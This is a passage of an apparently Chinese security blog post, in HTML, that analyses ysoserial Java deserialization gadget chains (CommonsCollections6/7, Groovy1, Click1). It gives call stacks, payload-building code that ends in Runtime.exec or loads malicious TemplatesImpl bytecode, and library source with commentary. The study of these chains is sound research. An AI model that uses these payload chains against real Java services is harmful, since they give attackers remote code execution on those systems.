class_">Class</span>[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                    <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射修改 keySet 的返回结果为 TiedMapEntry</span></span><br><span class="line">    <span class="comment">// hashset 的 map 属性（HashMap）</span></span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);   <span class="comment">// 容量为 1</span></span><br><span class="line">    map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hashmap 的 table 属性（节点 node 数组）</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f2);</span><br><span class="line">    Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line">    <span class="comment">// 第一个节点</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TiedMapEntry 存入 node 节点的 key</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(keyField);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><blockquote><p>和 CC6&#x2F;CC5&#x2F;CC1 类似，使用 ChainedTransformer 承载恶意代码<br>通过 AbstractMap#equals 来触发 LazyMap#get 方法的调用</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1</li><li>jdk 1.8</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    Hashtable.readObject</span><br><span class="line">        Hashtable.reconstitutionPut</span><br><span class="line">            AbstractMapDecorator.equals</span><br><span class="line">                AbstractMap.equals</span><br><span class="line">                    LazyMap.get</span><br><span class="line">                        ChainedTransformer.transform</span><br><span class="line">                            InvokerTransformer.transform</span><br><span class="line">                                Method.invoke</span><br><span class="line">                                DelegatingMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke0</span><br><span class="line">                                Runtime.exec</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/PAvzWR9u3k1VKSM.png" ><p>ysoserial.payloads.CommonsCollections7#getObject 首先构造 ChainedTransformer（同CC1），然后创建两个 LazyMap 作为 HashTable 的元素（<code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code>），最后将第二个 LazyMap 中的元素移除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Hashtable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;command&#125;;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建 LazyMap 作为 Hashtable 的元素</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>); <span class="comment">// 没有值，直接存</span></span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">2</span>); <span class="comment">// 有值，比较后再存</span></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用两次 put 方法放入两个 LazyMap</p><ul><li>反序列化时，readObject 实际调用的是 reconstitutionPut</li><li>第一次调用时，会把 key 和 value 注册到 tab 中</li><li>第二次调用时，tab 中有内容则进入 for 循环中，从而调用 equals 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">    <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashTable#put 在 table 中有元素时会调用 equals 方法，当调用完毕后，lazyMap2 的 key 中就会增加一个键为 yy，值为 UNIXProcess 实例的元素，而 UNIXProcess 没有继承 Serializable，无法序列化，因此需要移除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2><blockquote><p>Groovy 中使用 <code>&quot;command&quot;.execute()</code> 执行命令<br>用 MethodClosure 承载指令，用于实例化 ConvertedClosure<br>使用 ConvertedClosure 创建 Map 类型代理</p><ul><li>ConvertedClosure 的父类 ConversionHandler 实现 InvocationHandler，并重写了 invoke 方法<br>创建 AnnotationInvocationHandler 代理，在反序列化代理时，会对 memberValues 调用 map.entrySet，进一步调用 ConversionHandler.invoke 方法，实际调用 ConvertedClosure.invokeCustom，最后调用 MethodClosure 父类 Closure.call 方法</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line"><span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="literal">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);<span class="comment">//传入的是MethodClosure</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                ConversionHandler.invoke()</span><br><span class="line">                    ConvertedClosure.invokeCustom()</span><br><span class="line">    MethodClosure.call()</span><br><span class="line">    ...</span><br><span class="line">      Method.invoke()</span><br><span class="line">    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/A6MvdZRs8qPpF3Y.png" ><p>ysoserial.payloads.Groovy1#getObject 首选利用 MethodClosure 承载要执行的指令，然后构造 ConvertedClosure，再用于实例化 AnnotationInvocationHandler 代理，最后返回的是代理对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// MethodClosure -&gt; 父类 ConversionHandler.delegate</span></span><br><span class="line">    <span class="comment">// &quot;entrySet&quot; -&gt; ConvertedClosure.methodName</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">ConvertedClosure</span> <span class="variable">closure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(<span class="keyword">new</span> <span class="title class_">MethodClosure</span>(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 ConvertedClosure 创建 Map 类型的代理对象</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> Gadgets.createProxy(closure, Map.class);</span><br><span class="line">    <span class="comment">// 利用反射机制创建 AnnotationInvocationHandler 代理，将 map 保存到 memberValues 属性中</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(map);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Click1"><a href="#Click1" class="headerlink" title="Click1"></a>Click1</h2><blockquote><p>Web 应用框架<br>和 CC2 类似思路</p><ul><li>利用 TemplatesImpl 承载恶意调用链</li><li>PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br>这里使用 Column$ColumnComparator#compare 方法</li></ul></blockquote><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            Column$ColumnComparator.compare()</span><br><span class="line">                Column.getProperty()</span><br><span class="line">                  PropertyUtils.getValue()</span><br><span class="line">                    PropertyUtils.getObjectPropertyValue()</span><br><span class="line">                      Method.invoke()</span><br><span class="line">                        TemplatesImpl.getOutputProperties()</span><br><span class="line">                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/dpkRxuNwU34JQzn.png" ><p>TemplatesImpl 类主要的作用为：</p><ul><li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li><li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li></ul><p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列），当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>，然后通过调用 Column.getProperty 进一步触发 TemplatesImpl.getOutputProperties</p><p>ysoserial.payloads.Click1#getObject 创建 Column$ColumnComparator 比较器，作为 PriorityQueue 的参数；先设置正常的变量值，然后设置 Column 的 name 变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// prepare a Column.comparator with mock values</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Column</span> <span class="variable">column</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Column</span>(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line">    column.setTable(<span class="keyword">new</span> <span class="title class_">Table</span>());</span><br><span class="line">    <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (Comparator) Reflections.newInstance(<span class="string">&quot;org.apache.click.control.Column$ColumnComparator&quot;</span>, column);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create queue with numbers and our comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// switch method called by the comparator,</span></span><br><span class="line">    <span class="comment">// so it will trigger getOutputProperties() when objects in the queue are compared</span></span><br><span class="line">    column.setName(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// finally, we inject and new TemplatesImpl object into the queue,</span></span><br><span class="line">    <span class="comment">// so its getOutputProperties() method will be called</span></span><br><span class="line">    <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">    queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Column$ColumnComparator.compare 方法，其中 row1 为恶意 TemplatesImpl 对象，row2 为 <code>BigInteger(&quot;1&quot;)</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object row1, Object row2)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ascendingSort = <span class="built_in">this</span>.column.getTable().isSortedAscending() ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.column.getProperty(row1); <span class="comment">// 这里</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.column.getProperty(row2);</span><br><span class="line">    <span class="keyword">if</span> (value1 <span class="keyword">instanceof</span> Comparable &amp;&amp; value2 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        <span class="keyword">return</span> !(value1 <span class="keyword">instanceof</span> String) &amp;&amp; !(value2 <span class="keyword">instanceof</span> String) ? ((Comparable)value1).compareTo(value2) * <span class="built_in">this</span>.ascendingSort : <span class="built_in">this</span>.stringCompare(value1, value2) * <span class="built_in">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="literal">null</span> &amp;&amp; value2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value1.toString().compareToIgnoreCase(value2.toString()) * <span class="built_in">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="literal">null</span> &amp;&amp; value2 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> * <span class="built_in">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value1 == <span class="literal">null</span> &amp;&amp; value2 != <span class="literal">null</span> ? -<span class="number">1</span> * <span class="built_in">this</span>.ascendingSort : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 this.column.getProperty(row1)，其中，调用 this.getName() 获取 Column 的 name 属性，并调用 this.getProperty(name, row)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Object row)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getProperty(<span class="built_in">this</span>.getName(), row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为传入的 TemplatesImpl 对象不是 Map 的子类，直接跳过 if 判断，在为 methodCache 属性初始化 HashMap 类型对象后，调用 PropertyUtils.getValue(row, name, this.methodCache) 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 